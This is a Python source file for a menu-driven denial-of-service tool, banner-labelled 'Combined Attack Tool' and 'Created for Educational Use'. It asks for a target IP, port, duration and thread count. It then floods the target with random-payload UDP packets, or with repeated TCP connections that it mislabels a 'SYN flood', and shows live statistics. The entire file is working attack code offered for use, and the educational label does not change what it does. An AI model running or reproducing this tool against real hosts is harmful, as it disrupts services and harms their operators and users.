import os
import sys
import socket
import random
import time
from termcolor import colored
from threading import Thread, Lock

# Banner
def show_banner():
    os.system("clear")
    print(colored("""
    █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
   ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║  ██║
   ███████║   ██║      ██║   ███████║██║     ███████║
   ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔══██║
   ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██║
   ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
    """, "red"))
    print(colored("*******************************************", "yellow"))
    print(colored("*            Combined Attack Tool         *", "yellow"))
    print(colored("*         Created for Educational Use     *", "yellow"))
    print(colored("*******************************************", "yellow"))
    print(colored("Author: Educational Example", "green"))
    print(colored("Usage of this tool must comply with all laws.", "blue"))
    print()

# UDP Flood Attack with Live Stats
def udp_flood(ip, port, duration, threads, bytes_to_send):
    lock = Lock()
    stats = {"bytes_sent": 0, "packets_sent": 0}

    def attack():
        nonlocal stats
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(bytes_to_send)
        timeout = time.time() + duration

        while time.time() < timeout:
            try:
                sock.sendto(payload, (ip, port))
                with lock:
                    stats["bytes_sent"] += bytes_to_send
                    stats["packets_sent"] += 1
            except KeyboardInterrupt:
                break

    print(colored(f"Starting UDP Flood attack on {ip}:{port}", "yellow"))
    thread_list = [Thread(target=attack) for _ in range(threads)]
    for thread in thread_list:
        thread.start()

    # Live statistics
    while any(thread.is_alive() for thread in thread_list):
        with lock:
            print(colored(f"Bytes sent: {stats['bytes_sent']} | Packets sent: {stats['packets_sent']}", "cyan"), end="\r")
        time.sleep(1)

    for thread in thread_list:
        thread.join()
    print(colored("\nUDP Flood attack completed.", "green"))

# SYN Flood Attack with Live Stats
def syn_flood(ip, port, duration, threads):
    lock = Lock()
    stats = {"connections_sent": 0}

    def attack():
        nonlocal stats
        timeout = time.time() + duration

        while time.time() < timeout:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((ip, port))
                with lock:
                    stats["connections_sent"] += 1
                sock.close()
            except socket.error:
                pass
            except KeyboardInterrupt:
                break

    print(colored(f"Starting SYN Flood attack on {ip}:{port}", "yellow"))
    thread_list = [Thread(target=attack) for _ in range(threads)]
    for thread in thread_list:
        thread.start()

    # Live statistics
    while any(thread.is_alive() for thread in thread_list):
        with lock:
            print(colored(f"Connections sent: {stats['connections_sent']}", "cyan"), end="\r")
        time.sleep(1)

    for thread in thread_list:
        thread.join()
    print(colored("\nSYN Flood attack completed.", "green"))

# Main Function
def main():
    while True:
        show_banner()
        print("1. Start UDP Flood")
        print("2. Start SYN Flood")
        print("3. Exit")

        choice = input(colored("Select an option: ", "cyan"))

        if choice == "1":
            ip, port, duration = get_target_info()
            threads = get_threads()
            bytes_to_send = get_bytes()
            udp_flood(ip, port, duration, threads, bytes_to_send)
        elif choice == "2":
            ip, port, duration = get_target_info()
            threads = get_threads()
            syn_flood(ip, port, duration, threads)
        elif choice == "3":
            print(colored("Exiting... Goodbye!", "red"))
            sys.exit()
        else:
            print(colored("Invalid choice. Please try again.", "red"))

def get_target_info():
    ip = input(colored("Enter target IP: ", "cyan"))
    port = int(input(colored("Enter target port: ", "cyan")))
    duration = int(input(colored("Enter attack duration (seconds): ", "cyan")))
    return ip, port, duration

def get_threads():
    threads = int(input(colored("Enter number of threads (Max: 100): ", "cyan")))
    return min(threads, 100)

def get_bytes():
    bytes_to_send = int(input(colored("Enter bytes per packet (Max: 65535): ", "cyan")))
    return min(bytes_to_send, 65535)

if __name__ == "__main__":
    main()
